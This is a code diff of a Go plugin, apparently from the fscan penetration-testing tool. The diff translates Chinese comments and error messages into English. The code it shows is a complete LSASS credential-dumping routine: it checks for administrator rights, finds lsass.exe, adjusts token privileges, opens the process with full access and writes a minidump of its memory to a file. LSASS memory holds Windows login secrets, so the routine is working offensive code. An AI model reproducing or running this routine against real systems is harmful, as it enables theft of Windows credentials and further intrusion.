@@ -1,5 +1,3 @@
-//go:build windows
-
 package Plugins
 
 import (
@@ -51,28 +49,28 @@ type TOKEN_PRIVILEGES struct {
 	Privileges     [1]LUID_AND_ATTRIBUTES
 }
 
-// ProcessManager 处理进程相关操作
+// ProcessManager handles process-related operations
 type ProcessManager struct {
 	kernel32 *syscall.DLL
 	dbghelp  *syscall.DLL
 	advapi32 *syscall.DLL
 }
 
-// 创建新的进程管理器
+// Create a new process manager
 func NewProcessManager() (*ProcessManager, error) {
 	kernel32, err := syscall.LoadDLL("kernel32.dll")
 	if err != nil {
-		return nil, fmt.Errorf("加载 kernel32.dll 失败: %v", err)
+		return nil, fmt.Errorf("Failed to load kernel32.dll: %v", err)
 	}
 
 	dbghelp, err := syscall.LoadDLL("Dbghelp.dll")
 	if err != nil {
-		return nil, fmt.Errorf("加载 Dbghelp.dll 失败: %v", err)
+		return nil, fmt.Errorf("Failed to load Dbghelp.dll: %v", err)
 	}
 
 	advapi32, err := syscall.LoadDLL("advapi32.dll")
 	if err != nil {
-		return nil, fmt.Errorf("加载 advapi32.dll 失败: %v", err)
+		return nil, fmt.Errorf("Failed to load advapi32.dll: %v", err)
 	}
 
 	return &ProcessManager{
@@ -86,7 +84,7 @@ func (pm *ProcessManager) createProcessSnapshot() (uintptr, error) {
 	proc := pm.kernel32.MustFindProc("CreateToolhelp32Snapshot")
 	handle, _, err := proc.Call(uintptr(TH32CS_SNAPPROCESS), 0)
 	if handle == uintptr(INVALID_HANDLE_VALUE) {
-		return 0, fmt.Errorf("创建进程快照失败: %v", err)
+		return 0, fmt.Errorf("Failed to create process snapshot: %v", err)
 	}
 	return handle, nil
 }
@@ -101,7 +99,7 @@ func (pm *ProcessManager) findProcessInSnapshot(snapshot uintptr, name string) (
 
 	ret, _, _ := proc32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
 	if ret == 0 {
-		return 0, fmt.Errorf("获取第一个进程失败")
+		return 0, fmt.Errorf("Failed to get the first process")
 	}
 
 	for {
@@ -120,7 +118,7 @@ func (pm *ProcessManager) findProcessInSnapshot(snapshot uintptr, name string) (
 		}
 	}
 
-	return 0, fmt.Errorf("未找到进程: %s", name)
+	return 0, fmt.Errorf("Process not found: %s", name)
 }
 
 func (pm *ProcessManager) closeHandle(handle uintptr) {
@@ -137,7 +135,7 @@ func (pm *ProcessManager) ElevatePrivileges() error {
 	var token syscall.Token
 	err = syscall.OpenProcessToken(handle, syscall.TOKEN_ADJUST_PRIVILEGES|syscall.TOKEN_QUERY, &token)
 	if err != nil {
-		return fmt.Errorf("打开进程令牌失败: %v", err)
+		return fmt.Errorf("Failed to open process token: %v", err)
 	}
 	defer token.Close()
 
@@ -150,7 +148,7 @@ func (pm *ProcessManager) ElevatePrivileges() error {
 		uintptr(unsafe.Pointer(&tokenPrivileges.Privileges[0].Luid)),
 	)
 	if ret == 0 {
-		return fmt.Errorf("查找特权值失败: %v", err)
+		return fmt.Errorf("Failed to lookup privilege value: %v", err)
 	}
 
 	tokenPrivileges.PrivilegeCount = 1
@@ -166,7 +164,7 @@ func (pm *ProcessManager) ElevatePrivileges() error {
 		0,
 	)
 	if ret == 0 {
-		return fmt.Errorf("调整令牌特权失败: %v", err)
+		return fmt.Errorf("Failed to adjust token privileges: %v", err)
 	}
 
 	return nil
@@ -176,7 +174,7 @@ func (pm *ProcessManager) getCurrentProcess() (syscall.Handle, error) {
 	proc := pm.kernel32.MustFindProc("GetCurrentProcess")
 	handle, _, _ := proc.Call()
 	if handle == 0 {
-		return 0, fmt.Errorf("获取当前进程句柄失败")
+		return 0, fmt.Errorf("Failed to get current process handle")
 	}
 	return syscall.Handle(handle), nil
 }
@@ -206,7 +204,7 @@ func (pm *ProcessManager) DumpProcess(pid uint32, outputPath string) error {
 	)
 
 	if ret == 0 {
-		return fmt.Errorf("写入转储文件失败: %v", err)
+		return fmt.Errorf("Failed to write dump file: %v", err)
 	}
 
 	return nil
@@ -216,7 +214,7 @@ func (pm *ProcessManager) openProcess(pid uint32) (uintptr, error) {
 	proc := pm.kernel32.MustFindProc("OpenProcess")
 	handle, _, err := proc.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
 	if handle == 0 {
-		return 0, fmt.Errorf("打开进程失败: %v", err)
+		return 0, fmt.Errorf("Failed to open process: %v", err)
 	}
 	return handle, nil
 }
@@ -239,13 +237,13 @@ func (pm *ProcessManager) createDumpFile(path string) (uintptr, error) {
 	)
 
 	if handle == INVALID_HANDLE_VALUE {
-		return 0, fmt.Errorf("创建文件失败: %v", err)
+		return 0, fmt.Errorf("Failed to create file: %v", err)
 	}
 
 	return handle, nil
 }
 
-// 查找目标进程
+// Find the target process
 func (pm *ProcessManager) FindProcess(name string) (uint32, error) {
 	snapshot, err := pm.createProcessSnapshot()
 	if err != nil {
@@ -256,7 +254,7 @@ func (pm *ProcessManager) FindProcess(name string) (uint32, error) {
 	return pm.findProcessInSnapshot(snapshot, name)
 }
 
-// 检查是否具有管理员权限
+// Check if the user has admin privileges
 func IsAdmin() bool {
 	var sid *windows.SID
 	err := windows.AllocateAndInitializeSid(
@@ -277,43 +275,43 @@ func IsAdmin() bool {
 }
 
 func MiniDump(info *Common.HostInfo) (err error) {
-	// 先检查管理员权限
+	// First check for admin privileges
 	if !IsAdmin() {
-		Common.LogError("需要管理员权限才能执行此操作")
-		return fmt.Errorf("需要管理员权限才能执行此操作")
+		Common.LogError("Administrator privileges are required to perform this operation")
+		return fmt.Errorf("Administrator privileges are required to perform this operation")
 	}
 
 	pm, err := NewProcessManager()
 	if err != nil {
-		Common.LogError(fmt.Sprintf("初始化进程管理器失败: %v", err))
-		return fmt.Errorf("初始化进程管理器失败: %v", err)
+		Common.LogError(fmt.Sprintf("Failed to initialize process manager: %v", err))
+		return fmt.Errorf("Failed to initialize process manager: %v", err)
 	}
 
-	// 查找 lsass.exe
+	// Find lsass.exe
 	pid, err := pm.FindProcess("lsass.exe")
 	if err != nil {
-		Common.LogError(fmt.Sprintf("查找进程失败: %v", err))
-		return fmt.Errorf("查找进程失败: %v", err)
+		Common.LogError(fmt.Sprintf("Failed to find process: %v", err))
+		return fmt.Errorf("Failed to find process: %v", err)
 	}
-	Common.LogSuccess(fmt.Sprintf("找到进程 lsass.exe, PID: %d", pid))
+	Common.LogSuccess(fmt.Sprintf("Found process lsass.exe, PID: %d", pid))
 
-	// 提升权限
+	// Elevate privileges
 	if err := pm.ElevatePrivileges(); err != nil {
-		Common.LogError(fmt.Sprintf("提升权限失败: %v", err))
-		return fmt.Errorf("提升权限失败: %v", err)
+		Common.LogError(fmt.Sprintf("Failed to elevate privileges: %v", err))
+		return fmt.Errorf("Failed to elevate privileges: %v", err)
 	}
-	Common.LogSuccess("成功提升进程权限")
+	Common.LogSuccess("Successfully elevated process privileges")
 
-	// 创建输出路径
+	// Create output path
 	outputPath := filepath.Join(".", fmt.Sprintf("fscan-%d.dmp", pid))
 
-	// 执行转储
+	// Perform dump
 	if err := pm.DumpProcess(pid, outputPath); err != nil {
 		os.Remove(outputPath)
-		Common.LogError(fmt.Sprintf("进程转储失败: %v", err))
-		return fmt.Errorf("进程转储失败: %v", err)
+		Common.LogError(fmt.Sprintf("Failed to dump process: %v", err))
+		return fmt.Errorf("Failed to dump process: %v", err)
 	}
 
-	Common.LogSuccess(fmt.Sprintf("成功将进程内存转储到文件: %s", outputPath))
+	Common.LogSuccess(fmt.Sprintf("Successfully dumped process memory to file: %s", outputPath))
 	return nil
 }
